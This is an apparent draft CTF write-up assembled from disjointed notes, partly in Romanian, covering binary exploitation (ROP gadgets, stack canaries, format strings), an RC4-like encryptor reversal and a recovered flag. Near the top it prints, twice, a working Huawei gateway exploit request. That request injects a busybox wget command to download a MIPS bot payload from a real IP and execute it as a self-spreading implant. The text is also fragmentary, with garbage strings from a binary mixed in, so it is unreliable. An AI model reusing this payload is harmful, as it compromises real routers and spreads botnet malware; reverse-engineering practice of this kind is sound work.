+++
date = '2026-05-16'
draft = true
title = 'OSCN 2026'
ShowToc = true
tags = ["ctf"]
+++

## Overview


.mpsl
.mips
.x86

.mpsl,.mips,.x86

.mips,.mpsl,.x86

.x86,.mpsl,.mips

.x86,.mips,.mpsl

.mpsl,.x86,.mips

.mips,.x86,.mpsl

cdn-cgi/
 HTTP/1.1
User-Agent: 
Host: 
Cookie: 
http
url=
POST
POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
Content-Length: 430
Connection: keep-alive
Accept: */*
Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=000000>
P\pqDF
\pqCP
01, cnonce="248d1a2560100669"
<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 158.94.210.88 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmod 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
VUUU
abcdefghijklmnopqrstuvw012345678
vkkp
pe^~D670=1<1=
pwckmjckj
wkhkoa}
e`imj
`abeqhp
qwav
cqawp
pahjape`imj
POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
Content-Length: 430
Connection: keep-alive
Accept: */*
Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=0000006
P\pqDF
P\pqDF
\pqCP
01, cnonce="248d1a2560100669"
<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 158.94.210.88 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmod 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
VUUU
abcdefghijklmnopqrstuvw012345678

#overwrite printf got with system in libc... but aslr
#cant overwrite rip as long as we dont have canary

#leak canary, stack then modify the stack with fmt_str(

#https://ctftime.org/writeup/16594
#no pop rdi? do one gadgets?
 ► 0x7fcebae77613 <buffered_vfprintf+115>    movaps xmmword ptr [rsp + 0x40], xmm0         <[0x7ffe92b3d398] not aligned to 16 bytes>
0oricum putem scrie doar pana la canary aparent


#is this statically linked?
#

0x7fffa5b815e0: 0x4242424242424242      0x4242424242424242
0x7fffa5b815f0: 0x4242424242424242      0x4242424242424242
0x7fffa5b81600: 0x4242424242424242      0x4242424242424242
0x7fffa5b81610: 0x4242424242424242      0x4242424242424242
0x7fffa5b81620: 0x4242424242424242      0x4242424242424242
0x7fffa5b81630: 0x4242424242424242      0x4242424242424242
0x7fffa5b81640: 0x4242424242424242      0x4242424242424242
0x7fffa5b81650: 0x4242424242424242      0x0042424242424242
0x7fffa5b81660: 0x4141414141414141      0x4141414141414141
0x7fffa5b81670: 0x4141414141414141      0x4141414141414141
0x7fffa5b81680: 0x4141414141414141      0x4141414141414141
0x7fffa5b81690: 0x4141414141414141      0x4141414141414141
0x7fffa5b816a0: 0x4141414141414141      0x4141414141414141
0x7fffa5b816b0: 0x4141414141414141      0x4141414141414141
0x7fffa5b816c0: 0x4141414141414141      0x4141414141414141
0x7fffa5b816d0: 0x4141414141414141      0x4141414141414141

mai intai len2 poi len1
ah bruh le citeste in finalstr pe amb
tolower... hmm

128 + 64 apoi rbp apoi rip
tolower = a1 + 128 a1 + 128 <= 0x17F

altfel doar return a1
problema e ca o sa ne strice payloadu?

ascii D = 68, ascii d = 100
de fapt se adauga 0x20? ig?

  result = a1;
  if ( a1 + 128 <= 0x17F )
    return *(unsigned int *)(*(_QWORD *)(*(_QWORD *)__readfsqword(0xFFFFFF98) + 88LL) + 4LL * (int)(a1 + 128));
  return result;
}
gen de ce
ok wtv luam toti bytes din payload si decrementam
dar nu este got

#he offset was 72 and therefore we can use this information to get a shell.
Since no nx is enabled therefore I used mprotect to change the protections of a memory region that was not affected by aslr e.g bss wrote a shell there and returned to the region to get a shell.

_libc_read si noi ig

terminam tolower unexpectedly? string parsing unexpectedly?
merge pana la len2 dar asa nu le mai citeste pl lui
#0x0000000000464780: mov rax, 0xf; syscall; 
 ma pis la 0x46
 
 
 --- Baraj



![challenge-screenshot](1.png#center)
![challenge-screenshot](2.png#center)
![challenge-screenshot](3.png#center)
![challenge-screenshot](4.png#center)


#0x00000000004020c3: mov rax, qword ptr [rsp + 8]; call rax; (putem pune in acest rax, gadget de rdi <- rsp + zed
0x000000000040a81b: mov rax, qword ptr [rsp]; call rax; 
0x00000000004020bf: mov esi, dword ptr [rsp + 0x18]; mov rax, qword ptr [rsp + 8]; call rax; 
!!!
inainte de asta ar tr sa facem niste pops though
advance rsp
0x000000000040b4dd: jg 0xb510; add rsp, 0x18; mov eax, r12d; pop rbx; pop r12; ret; 
0x000000000040be3a: jne 0xbe44; add rsp, 0xd8; ret; 
0x000000000040bef8: jne 0xbf02; add rsp, 0xd8; ret; 
0x000000000040be3c: add rsp, 0xd8; ret; 
if prea mare
0x000000000040b4df: add rsp, 0x18; mov eax, r12d; pop rbx; pop r12; ret; 
0x000000000040c0c8: add rsp, 0x18; pop rbx; pop rbp; pop r12; pop r13; ret; 


## encryptor

```c
unsigned __int64 __fastcall sub_156A(__int64 buf, __int64 size, __int64 bytes, __int64 bytes_size, __int64 s1)
{
  __int64 v5; // kr00_8
  __int64 v6; // kr08_8
  char v8; // [rsp+37h] [rbp-229h]
  char v9; // [rsp+37h] [rbp-229h]
  int v10; // [rsp+38h] [rbp-228h]
  int v11; // [rsp+38h] [rbp-228h]
  int v12; // [rsp+3Ch] [rbp-224h]
  int i; // [rsp+40h] [rbp-220h]
  int j; // [rsp+44h] [rbp-21Ch]
  int k; // [rsp+48h] [rbp-218h]
  _BYTE v16[520]; // [rsp+50h] [rbp-210h]
  unsigned __int64 v17; // [rsp+258h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  v10 = 0;
  v12 = 0;
  for ( i = 0; i <= 255; ++i )
  {
    v16[i + 256] = i;                           // second half
    v16[i] = *(_BYTE *)(i % bytes_size + bytes);// bytes pe loop (size=32)
  }
  for ( j = 0; j <= 255; ++j )
  {
    v5 = v10 + (unsigned __int8)v16[j + 256] + (unsigned __int8)v16[j];
    v10 = (unsigned __int8)(HIBYTE(v5) + v10 + v16[j + 256] + v16[j]) - HIBYTE(HIDWORD(v5));
    v8 = v16[v10 + 256];
    v16[v10 + 256] = v16[j + 256];
    v16[j + 256] = v8;
  }
  v11 = 0;
  for ( k = 0; size > k; ++k )
  {
    v12 = (v12 + 1) % 256;
    v6 = (unsigned __int8)v16[v12 + 256] + v11;
    v11 = (unsigned __int8)(HIBYTE(v6) + v16[v12 + 256] + v11) - HIBYTE(HIDWORD(v6));
    v9 = v16[v11 + 256];
    v16[v11 + 256] = v16[v12 + 256];
    v16[v12 + 256] = v9;                        // toate chestiile astea n-au legatura cu inputul nostru, doar linie de mai de jos deci putem continua de aici
    *(_BYTE *)(k + s1) = *(_BYTE *)(k + buf) ^ v16[(unsigned __int8)(v16[v12 + 256] + v16[v11 + 256]) + 256];
  }
  return v17 - __readfsqword(0x28u);
}
```

brva 0x17E8 acolo

adica buf[i] ^ bytes_dubios[i] trebuie sa fie flag.enc
adica input corect = btes_dubios ^ flagenc

pui break in xor si verifici de la unde e mallocat 

```
0x55555555a500  0xaae471a07749db06      0x6af608d29736c078      ..Iw.q..x.6....j
0x55555555a510  0x87ace3e13a34d5e0      0x42b2db5680d75019      ..4:.....P..V..B
0x55555555a520  0x090cb922cdcf151e      0x519ab6aa87366244      ...."...Db6....Q
0x55555555a530  0x0aaa5f2e327756ce      0x67ccc1c02dad417c      .Vw2._..|A.-...g
0x55555555a540  0x00008ddd24bad4db      0x000000000001fac1      ...$............         <-- Top chunk
```

0x43
0x54
0x46
0x7b
0x62
0x66
0x35
0x38
0x66
0x35
0x30
0x65
0x36
0x36
0x66
0x39
0x35
0x37
0x62
0x61
0x37
0x33
0x61
0x30
0x66
0x30
0x36
0x34
0x37
0x30
0x36
0x32
0x37
0x31
0x66
0x35
0x31
0x63
0x36
0x38
0x61
0x65
0x66
0x64
0x63
0x61
0x36
0x37
0x36
0x38
0x35
0x33
0x36
0x35
0x63
0x65
0x33
0x61
0x63
0x33
0x37
0x64
0x66
0x31
0x37
0x62
0x65
0x35
0x7d
0xa
CTF{bf58f50e66f957ba73a0f064706271f51c68aefdca67685365ce3ac37df17be5}

